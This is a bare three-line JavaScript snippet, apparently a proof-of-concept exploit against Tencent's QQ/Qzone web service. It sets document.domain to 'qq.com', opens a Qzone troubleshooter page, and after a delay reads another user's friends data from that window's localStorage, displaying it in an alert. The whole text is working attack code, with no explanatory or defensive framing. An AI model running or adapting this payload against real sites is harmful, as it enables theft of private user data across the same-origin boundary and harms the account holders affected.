document.domain="qq.com";
var a = window.open("https://user.qzone.qq.com/troubleshooter?traytip");
setTimeout('alert(a.localStorage.getItem("app_friends_649114132"))',3000);
